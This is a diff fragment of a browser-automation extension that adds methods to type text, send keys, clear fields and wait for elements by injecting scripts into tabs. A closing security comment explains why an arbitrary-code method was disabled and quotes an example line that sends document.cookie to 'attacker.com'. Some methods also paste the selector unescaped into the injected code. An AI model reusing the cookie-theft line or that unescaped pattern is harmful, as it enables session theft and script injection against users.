+                    };
+                  }
+                }
+              } else {
+                // Use currently focused element
+                targetElement = document.activeElement;
+                if (!targetElement || targetElement === document.body) {
+                  return {
+                    success: false,
+                    message: "No element is focused. Please provide a selector or focus an element first.",
+                    charactersTyped: 0,
+                    elementInfo: { exists: false, visible: false, interactable: false }
+                  };
+                }
+              }
+
+              // Check element properties
+              const rect = targetElement.getBoundingClientRect();
+              const isVisible = rect.width > 0 && rect.height > 0 &&
+                               window.getComputedStyle(targetElement).visibility !== 'hidden' &&
+                               window.getComputedStyle(targetElement).display !== 'none';
+              
+              const isInteractable = !targetElement.disabled && !targetElement.readOnly;
+              
+              if (!isVisible) {
+                return {
+                  success: false,
+                  message: "Element is not visible",
+                  charactersTyped: 0,
+                  elementInfo: { exists: true, visible: false, interactable: isInteractable, boundingRect: rect }
+                };
+              }
+              
+              if (!isInteractable) {
+                return {
+                  success: false,
+                  message: "Element is not interactable (disabled or readonly)",
+                  charactersTyped: 0,
+                  elementInfo: { exists: true, visible: true, interactable: false, boundingRect: rect }
+                };
+              }
+
+              // Focus the element
+              targetElement.focus();
+              
+              // Clear existing text if requested
+              if (${clearFirst === true}) {
+                if (targetElement.tagName === 'INPUT' || targetElement.tagName === 'TEXTAREA') {
+                  targetElement.value = '';
+                } else if (targetElement.contentEditable === 'true') {
+                  targetElement.textContent = '';
+                }
+                
+                // Dispatch change event after clearing
+                targetElement.dispatchEvent(new Event('input', { bubbles: true }));
+                targetElement.dispatchEvent(new Event('change', { bubbles: true }));
+              }
+
+              const textToType = "${sanitizedText}";
+              let charactersTyped = 0;
+              
+              // Type text character by character with delay
+              for (let i = 0; i < textToType.length; i++) {
+                const char = textToType[i];
+                
+                // Set the value directly for input/textarea elements
+                if (targetElement.tagName === 'INPUT' || targetElement.tagName === 'TEXTAREA') {
+                  const currentValue = targetElement.value || '';
+                  targetElement.value = currentValue + char;
+                } else if (targetElement.contentEditable === 'true') {
+                  const currentText = targetElement.textContent || '';
+                  targetElement.textContent = currentText + char;
+                }
+                
+                charactersTyped++;
+                
+                // Dispatch input event for each character
+                targetElement.dispatchEvent(new Event('input', { bubbles: true }));
+                
+                // Add delay between characters if specified
+                if (${finalTypeDelay} > 0 && i < textToType.length - 1) {
+                  await new Promise(resolve => setTimeout(resolve, ${finalTypeDelay}));
+                }
+              }
+              
+              // Dispatch final change event
+              targetElement.dispatchEvent(new Event('change', { bubbles: true }));
+              
+              return {
+                success: true,
+                message: \`Successfully typed \${charactersTyped} characters\`,
+                charactersTyped: charactersTyped,
+                elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
+              };
+              
+            } catch (error) {
+              return {
+                success: false,
+                message: "Type failed: " + error.message,
+                charactersTyped: 0
+              };
+            }
+          })();
+        `
+        });
+        const result = results[0];
+        await this.client.sendResourceToServer({
+          resource: "type-result",
+          correlationId,
+          success: result.success,
+          message: result.message,
+          timestamp: Date.now(),
+          charactersTyped: result.charactersTyped,
+          elementInfo: result.elementInfo
+        });
+      } catch (error) {
+        console.error("Type text failed:", error);
+        await this.client.sendResourceToServer({
+          resource: "type-result",
+          correlationId,
+          success: false,
+          message: `Type failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now(),
+          charactersTyped: 0
+        });
+      }
+    }
+    async sendSpecialKeys(correlationId, tabId, keys, selector, modifiers) {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}`);
+        }
+        if (!Array.isArray(keys) || keys.length === 0) {
+          throw new Error("Keys must be a non-empty array");
+        }
+        const validKeys = [
+          "Enter",
+          "Tab",
+          "Escape",
+          "Backspace",
+          "Delete",
+          "ArrowUp",
+          "ArrowDown",
+          "ArrowLeft",
+          "ArrowRight",
+          "Home",
+          "End",
+          "PageUp",
+          "PageDown",
+          "F1",
+          "F2",
+          "F3",
+          "F4",
+          "F5",
+          "F6",
+          "F7",
+          "F8",
+          "F9",
+          "F10",
+          "F11",
+          "F12"
+        ];
+        for (const key of keys) {
+          if (!validKeys.includes(key)) {
+            throw new Error(`Invalid key: ${key}. Allowed keys: ${validKeys.join(", ")}`);
+          }
+        }
+        const finalModifiers = modifiers || {};
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+          (function() {
+            try {
+              let targetElement;
+              
+              // Find target element
+              if ("${selector}") {
+                const selectorStr = "${selector}";
+                targetElement = document.querySelector(selectorStr);
+                
+                if (!targetElement) {
+                  return {
+                    success: false,
+                    message: "Element not found: " + selectorStr,
+                    elementInfo: { exists: false, visible: false, interactable: false }
+                  };
+                }
+              } else {
+                // Use currently focused element
+                targetElement = document.activeElement;
+                if (!targetElement || targetElement === document.body) {
+                  return {
+                    success: false,
+                    message: "No element is focused. Please provide a selector or focus an element first.",
+                    elementInfo: { exists: false, visible: false, interactable: false }
+                  };
+                }
+              }
+
+              // Focus the element
+              targetElement.focus();
+              
+              const keyList = ${JSON.stringify(keys)};
+              const modifierKeys = ${JSON.stringify(finalModifiers)};
+              
+              // Key code mapping
+              const keyCodes = {
+                "Enter": 13, "Tab": 9, "Escape": 27, "Backspace": 8, "Delete": 46,
+                "ArrowUp": 38, "ArrowDown": 40, "ArrowLeft": 37, "ArrowRight": 39,
+                "Home": 36, "End": 35, "PageUp": 33, "PageDown": 34,
+                "F1": 112, "F2": 113, "F3": 114, "F4": 115, "F5": 116, "F6": 117,
+                "F7": 118, "F8": 119, "F9": 120, "F10": 121, "F11": 122, "F12": 123
+              };
+              
+              let successCount = 0;
+              
+              for (const key of keyList) {
+                const keyCode = keyCodes[key];
+                if (!keyCode) continue;
+                
+                // Create keyboard events
+                const keydownEvent = new KeyboardEvent('keydown', {
+                  key: key,
+                  code: key,
+                  keyCode: keyCode,
+                  which: keyCode,
+                  ctrlKey: modifierKeys.ctrl || false,
+                  altKey: modifierKeys.alt || false,
+                  shiftKey: modifierKeys.shift || false,
+                  metaKey: modifierKeys.meta || false,
+                  bubbles: true,
+                  cancelable: true
+                });
+                
+                const keyupEvent = new KeyboardEvent('keyup', {
+                  key: key,
+                  code: key,
+                  keyCode: keyCode,
+                  which: keyCode,
+                  ctrlKey: modifierKeys.ctrl || false,
+                  altKey: modifierKeys.alt || false,
+                  shiftKey: modifierKeys.shift || false,
+                  metaKey: modifierKeys.meta || false,
+                  bubbles: true,
+                  cancelable: true
+                });
+                
+                // Dispatch events
+                targetElement.dispatchEvent(keydownEvent);
+                targetElement.dispatchEvent(keyupEvent);
+                successCount++;
+              }
+              
+              return {
+                success: true,
+                message: \`Successfully sent \${successCount} special keys\`,
+                elementInfo: { exists: true, visible: true, interactable: true }
+              };
+              
+            } catch (error) {
+              return {
+                success: false,
+                message: "Send special keys failed: " + error.message
+              };
+            }
+          })();
+        `
+        });
+        const result = results[0];
+        await this.client.sendResourceToServer({
+          resource: "type-result",
+          correlationId,
+          success: result.success,
+          message: result.message,
+          timestamp: Date.now(),
+          elementInfo: result.elementInfo
+        });
+      } catch (error) {
+        console.error("Send special keys failed:", error);
+        await this.client.sendResourceToServer({
+          resource: "type-result",
+          correlationId,
+          success: false,
+          message: `Send special keys failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now()
+        });
+      }
+    }
+    async clearInputField(correlationId, tabId, selector, waitForElement) {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}`);
+        }
+        if (!selector || typeof selector !== "string") {
+          throw new Error("Selector is required and must be a string");
+        }
+        const finalWaitForElement = Math.max(0, Math.min(waitForElement || 5e3, 1e4));
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+          (async function() {
+            try {
+              const selectorStr = "${selector}";
+              let targetElement = document.querySelector(selectorStr);
+              
+              if (!targetElement) {
+                // Wait for element if waitForElement is specified
+                if (${finalWaitForElement} > 0) {
+                  const startTime = Date.now();
+                  while (!targetElement && (Date.now() - startTime) < ${finalWaitForElement}) {
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    targetElement = document.querySelector(selectorStr);
+                  }
+                }
+                
+                if (!targetElement) {
+                  return {
+                    success: false,
+                    message: "Element not found: " + selectorStr,
+                    elementInfo: { exists: false, visible: false, interactable: false }
+                  };
+                }
+              }
+
+              // Check element properties
+              const rect = targetElement.getBoundingClientRect();
+              const isVisible = rect.width > 0 && rect.height > 0 &&
+                               window.getComputedStyle(targetElement).visibility !== 'hidden' &&
+                               window.getComputedStyle(targetElement).display !== 'none';
+              
+              const isInteractable = !targetElement.disabled && !targetElement.readOnly;
+              
+              if (!isVisible) {
+                return {
+                  success: false,
+                  message: "Element is not visible",
+                  elementInfo: { exists: true, visible: false, interactable: isInteractable, boundingRect: rect }
+                };
+              }
+              
+              if (!isInteractable) {
+                return {
+                  success: false,
+                  message: "Element is not interactable (disabled or readonly)",
+                  elementInfo: { exists: true, visible: true, interactable: false, boundingRect: rect }
+                };
+              }
+
+              // Focus the element
+              targetElement.focus();
+              
+              // Clear the input field based on element type
+              let wasCleared = false;
+              const originalValue = targetElement.value || targetElement.textContent || '';
+              
+              if (targetElement.tagName === 'INPUT' || targetElement.tagName === 'TEXTAREA') {
+                targetElement.value = '';
+                wasCleared = true;
+              } else if (targetElement.contentEditable === 'true') {
+                targetElement.textContent = '';
+                wasCleared = true;
+              } else {
+                return {
+                  success: false,
+                  message: "Element is not a clearable input field (must be input, textarea, or contenteditable)",
+                  elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
+                };
+              }
+              
+              if (wasCleared) {
+                // Dispatch events to notify of the change
+                targetElement.dispatchEvent(new Event('input', { bubbles: true }));
+                targetElement.dispatchEvent(new Event('change', { bubbles: true }));
+                
+                // Verify the field was actually cleared
+                const newValue = targetElement.value || targetElement.textContent || '';
+                const actuallyCleared = newValue.length === 0;
+                
+                return {
+                  success: actuallyCleared,
+                  message: actuallyCleared
+                    ? \`Successfully cleared input field (was \${originalValue.length} characters)\`
+                    : "Failed to clear input field - value may be controlled by JavaScript",
+                  elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
+                };
+              } else {
+                return {
+                  success: false,
+                  message: "Failed to clear input field",
+                  elementInfo: { exists: true, visible: true, interactable: true, boundingRect: rect }
+                };
+              }
+              
+            } catch (error) {
+              return {
+                success: false,
+                message: "Clear input field failed: " + error.message
+              };
+            }
+          })();
+        `
+        });
+        const result = results[0];
+        await this.client.sendResourceToServer({
+          resource: "type-result",
+          correlationId,
+          success: result.success,
+          message: result.message,
+          timestamp: Date.now(),
+          elementInfo: result.elementInfo
+        });
+      } catch (error) {
+        console.error("Clear input field failed:", error);
+        await this.client.sendResourceToServer({
+          resource: "type-result",
+          correlationId,
+          success: false,
+          message: `Clear input field failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now()
+        });
+      }
+    }
+    async waitForTime(correlationId, duration, message) {
+      try {
+        if (duration < 100 || duration > 3e4) {
+          throw new Error(`Invalid duration: ${duration}ms. Duration must be between 100ms and 30000ms`);
+        }
+        const startTime = Date.now();
+        await new Promise((resolve) => setTimeout(resolve, duration));
+        const actualWaitTime = Date.now() - startTime;
+        const responseMessage = message ? `${message} (waited ${actualWaitTime}ms)` : `Waited for ${actualWaitTime}ms`;
+        await this.client.sendResourceToServer({
+          resource: "wait-result",
+          correlationId,
+          success: true,
+          message: responseMessage,
+          timestamp: Date.now(),
+          conditionMet: true,
+          waitTime: actualWaitTime
+        });
+      } catch (error) {
+        await this.client.sendResourceToServer({
+          resource: "wait-result",
+          correlationId,
+          success: false,
+          message: `Wait for time failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now(),
+          conditionMet: false,
+          waitTime: 0
+        });
+      }
+    }
+    async waitForElement(correlationId, tabId, selector, timeout = 5e3, pollInterval = 100, visible = false) {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}`);
+        }
+        if (!selector || typeof selector !== "string") {
+          throw new Error("Selector is required and must be a string");
+        }
+        if (timeout < 100 || timeout > 3e4) {
+          throw new Error(`Invalid timeout: ${timeout}ms. Timeout must be between 100ms and 30000ms`);
+        }
+        if (pollInterval < 50 || pollInterval > 1e3) {
+          throw new Error(`Invalid poll interval: ${pollInterval}ms. Poll interval must be between 50ms and 1000ms`);
+        }
+        const startTime = Date.now();
+        let tab;
+        try {
+          tab = await browser.tabs.get(tabId);
+        } catch (tabError) {
+          throw new Error(`Tab with ID ${tabId} not found or is not accessible`);
+        }
+        if (!tab.url) {
+          throw new Error(`Tab ${tabId} does not have a valid URL`);
+        }
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+        (function() {
+          const selector = ${JSON.stringify(selector)};
+          const timeout = ${timeout};
+          const pollInterval = ${pollInterval};
+          const checkVisible = ${visible};
+          const startTime = Date.now();
+
+          function isElementVisible(element) {
+            if (!element) return false;
+            
+            const style = window.getComputedStyle(element);
+            if (style.display === 'none' || style.visibility === 'hidden' || style.opacity === '0') {
+              return false;
+            }
+            
+            const rect = element.getBoundingClientRect();
+            return rect.width > 0 && rect.height > 0;
+          }
+
+          function getElementInfo(element) {
+            if (!element) {
+              return { exists: false, visible: false, interactable: false };
+            }
+            
+            const visible = isElementVisible(element);
+            const rect = element.getBoundingClientRect();
+            
+            return {
+              exists: true,
+              visible: visible,
+              interactable: visible && !element.disabled,
+              boundingRect: {
+                x: rect.x,
+                y: rect.y,
+                width: rect.width,
+                height: rect.height,
+                top: rect.top,
+                right: rect.right,
+                bottom: rect.bottom,
+                left: rect.left
+              }
+            };
+          }
+
+          return new Promise((resolve) => {
+            // Check if element already exists
+            const existingElement = document.querySelector(selector);
+            if (existingElement && (!checkVisible || isElementVisible(existingElement))) {
+              const waitTime = Date.now() - startTime;
+              resolve({
+                success: true,
+                found: true,
+                waitTime: waitTime,
+                elementInfo: getElementInfo(existingElement)
+              });
+              return;
+            }
+
+            let timeoutId;
+            let intervalId;
+
+            // Use MutationObserver for better performance
+            const observer = new MutationObserver((mutations) => {
+              const element = document.querySelector(selector);
+              if (element && (!checkVisible || isElementVisible(element))) {
+                clearTimeout(timeoutId);
+                clearInterval(intervalId);
+                observer.disconnect();
+                
+                const waitTime = Date.now() - startTime;
+                resolve({
+                  success: true,
+                  found: true,
+                  waitTime: waitTime,
+                  elementInfo: getElementInfo(element)
+                });
+              }
+            });
+
+            // Observe for changes in the entire document
+            observer.observe(document.body || document.documentElement, {
+              childList: true,
+              subtree: true,
+              attributes: checkVisible ? true : false,
+              attributeFilter: checkVisible ? ['style', 'class'] : undefined
+            });
+
+            // Fallback polling in case MutationObserver misses something
+            intervalId = setInterval(() => {
+              const element = document.querySelector(selector);
+              if (element && (!checkVisible || isElementVisible(element))) {
+                clearTimeout(timeoutId);
+                clearInterval(intervalId);
+                observer.disconnect();
+                
+                const waitTime = Date.now() - startTime;
+                resolve({
+                  success: true,
+                  found: true,
+                  waitTime: waitTime,
+                  elementInfo: getElementInfo(element)
+                });
+              }
+            }, pollInterval);
+
+            // Timeout handler
+            timeoutId = setTimeout(() => {
+              clearInterval(intervalId);
+              observer.disconnect();
+              
+              const waitTime = Date.now() - startTime;
+              const element = document.querySelector(selector);
+              resolve({
+                success: false,
+                found: false,
+                waitTime: waitTime,
+                elementInfo: getElementInfo(element),
+                error: \`Element "\${selector}" not found\${checkVisible ? ' or not visible' : ''} after \${timeout}ms\`
+              });
+            }, timeout);
+          });
+        })();
+        `
+        });
+        const result = results[0];
+        const actualWaitTime = Date.now() - startTime;
+        if (result.success) {
+          await this.client.sendResourceToServer({
+            resource: "wait-result",
+            correlationId,
+            success: true,
+            message: `Element "${selector}" found after ${result.waitTime}ms`,
+            timestamp: Date.now(),
+            conditionMet: true,
+            waitTime: actualWaitTime,
+            elementInfo: result.elementInfo
+          });
+        } else {
+          await this.client.sendResourceToServer({
+            resource: "wait-result",
+            correlationId,
+            success: false,
+            message: result.error || `Element "${selector}" not found after ${timeout}ms`,
+            timestamp: Date.now(),
+            conditionMet: false,
+            waitTime: actualWaitTime,
+            elementInfo: result.elementInfo
+          });
+        }
+      } catch (error) {
+        await this.client.sendResourceToServer({
+          resource: "wait-result",
+          correlationId,
+          success: false,
+          message: `Wait for element failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now(),
+          conditionMet: false,
+          waitTime: 0
+        });
+      }
+    }
+    async waitForElementVisibility(correlationId, tabId, selector, timeout = 5e3, threshold = 0.1) {
+      try {
+        if (!Number.isInteger(tabId) || tabId < 0) {
+          throw new Error(`Invalid tab ID: ${tabId}`);
+        }
+        if (!selector || typeof selector !== "string") {
+          throw new Error("Selector is required and must be a string");
+        }
+        if (timeout < 100 || timeout > 3e4) {
+          throw new Error(`Invalid timeout: ${timeout}ms. Timeout must be between 100ms and 30000ms`);
+        }
+        if (threshold < 0 || threshold > 1) {
+          throw new Error(`Invalid threshold: ${threshold}. Threshold must be between 0 and 1`);
+        }
+        const startTime = Date.now();
+        let tab;
+        try {
+          tab = await browser.tabs.get(tabId);
+        } catch (tabError) {
+          throw new Error(`Tab with ID ${tabId} not found or is not accessible`);
+        }
+        if (!tab.url) {
+          throw new Error(`Tab ${tabId} does not have a valid URL`);
+        }
+        const results = await browser.tabs.executeScript(tabId, {
+          code: `
+        (function() {
+          const selector = ${JSON.stringify(selector)};
+          const timeout = ${timeout};
+          const threshold = ${threshold};
+          const startTime = Date.now();
+
+          function getElementInfo(element) {
+            if (!element) {
+              return { exists: false, visible: false, interactable: false };
+            }
+            
+            const style = window.getComputedStyle(element);
+            const rect = element.getBoundingClientRect();
+            const visible = style.display !== 'none' &&
+                           style.visibility !== 'hidden' &&
+                           style.opacity !== '0' &&
+                           rect.width > 0 && rect.height > 0;
+            
+            return {
+              exists: true,
+              visible: visible,
+              interactable: visible && !element.disabled,
+              boundingRect: {
+                x: rect.x,
+                y: rect.y,
+                width: rect.width,
+                height: rect.height,
+                top: rect.top,
+                right: rect.right,
+                bottom: rect.bottom,
+                left: rect.left
+              }
+            };
+          }
+
+          return new Promise((resolve) => {
+            // Check if element exists first
+            let element = document.querySelector(selector);
+            if (!element) {
+              // Wait for element to exist using MutationObserver
+              const mutationObserver = new MutationObserver(() => {
+                element = document.querySelector(selector);
+                if (element) {
+                  mutationObserver.disconnect();
+                  setupIntersectionObserver();
+                }
+              });
+
+              mutationObserver.observe(document.body || document.documentElement, {
+                childList: true,
+                subtree: true
+              });
+
+              // Timeout for element existence
+              setTimeout(() => {
+                mutationObserver.disconnect();
+                const waitTime = Date.now() - startTime;
+                resolve({
+                  success: false,
+                  found: false,
+                  waitTime: waitTime,
+                  elementInfo: getElementInfo(null),
+                  error: \`Element "\${selector}" not found in DOM after \${timeout}ms\`
+                });
+              }, timeout);
+            } else {
+              setupIntersectionObserver();
+            }
+
+            function setupIntersectionObserver() {
+              // Check if already visible
+              const elementInfo = getElementInfo(element);
+              if (elementInfo.visible) {
+                const waitTime = Date.now() - startTime;
+                resolve({
+                  success: true,
+                  found: true,
+                  waitTime: waitTime,
+                  elementInfo: elementInfo
+                });
+                return;
+              }
+
+              // Use IntersectionObserver for visibility detection
+              const intersectionObserver = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                  if (entry.isIntersecting && entry.intersectionRatio >= threshold) {
+                    intersectionObserver.disconnect();
+                    const waitTime = Date.now() - startTime;
+                    resolve({
+                      success: true,
+                      found: true,
+                      waitTime: waitTime,
+                      elementInfo: getElementInfo(entry.target)
+                    });
+                  }
+                });
+              }, { threshold: threshold });
+
+              intersectionObserver.observe(element);
+
+              // Timeout handler
+              setTimeout(() => {
+                intersectionObserver.disconnect();
+                const waitTime = Date.now() - startTime;
+                resolve({
+                  success: false,
+                  found: false,
+                  waitTime: waitTime,
+                  elementInfo: getElementInfo(element),
+                  error: \`Element "\${selector}" not visible (threshold: \${threshold}) after \${timeout}ms\`
+                });
+              }, timeout);
+            }
+          });
+        })();
+        `
+        });
+        const result = results[0];
+        const actualWaitTime = Date.now() - startTime;
+        if (result.success) {
+          await this.client.sendResourceToServer({
+            resource: "wait-result",
+            correlationId,
+            success: true,
+            message: `Element "${selector}" became visible after ${result.waitTime}ms`,
+            timestamp: Date.now(),
+            conditionMet: true,
+            waitTime: actualWaitTime,
+            elementInfo: result.elementInfo
+          });
+        } else {
+          await this.client.sendResourceToServer({
+            resource: "wait-result",
+            correlationId,
+            success: false,
+            message: result.error || `Element "${selector}" did not become visible after ${timeout}ms`,
+            timestamp: Date.now(),
+            conditionMet: false,
+            waitTime: actualWaitTime,
+            elementInfo: result.elementInfo
+          });
+        }
+      } catch (error) {
+        await this.client.sendResourceToServer({
+          resource: "wait-result",
+          correlationId,
+          success: false,
+          message: `Wait for element visibility failed: ${error instanceof Error ? error.message : "Unknown error"}`,
+          timestamp: Date.now(),
+          conditionMet: false,
+          waitTime: 0
+        });
+      }
+    }
+    // SECURITY FIX: waitForCondition method has been disabled due to critical security vulnerability
+    //
+    // CRITICAL VULNERABILITY DETAILS:
+    // This method used `new Function()` to execute arbitrary JavaScript code provided by the user,
+    // which allowed complete system compromise. Attackers could:
+    // - Steal cookies: `fetch('attacker.com', {method: 'POST', body: document.cookie})`
+    // - Redirect users: `window.location = 'malicious-site.com'`
+    // - Access any browser API via `window` object
+    // - Execute any JavaScript in the content script context
+    //
+    // The "safe globals" approach was insufficient because:
+    // 1. `window` object provided access to all browser APIs
+    // 2. `document` object allowed DOM manipulation and data access
+    // 3. String interpolation in template literals bypassed pattern checks
+    // 4. No effective sandboxing was implemented
+    //
+    // SECURITY RECOMMENDATION:
+    // If condition checking is needed in the future, implement a whitelist-based approach
+    // with predefined safe conditions like:
+    // - element-exists: Check if selector exists
+    // - element-visible: Check if element is visible
+    // - element-has-text: Check if element contains specific text
+    // - element-has-class: Check if element has specific class
+    //
+    // DO NOT restore this method without a complete security review.
+    /*
+    private async waitForCondition(
+      correlationId: string,
+      tabId: number,
+      condition: string,
+      timeout: number = 5000,
+      pollInterval: number = 100,
+      args?: Record<string, any>
+    ): Promise<void> {
+      // METHOD DISABLED FOR SECURITY - See security comments above
+      throw new Error("waitForCondition has been permanently disabled for security reasons");
+    }
+    */
   };
 
   // background.ts
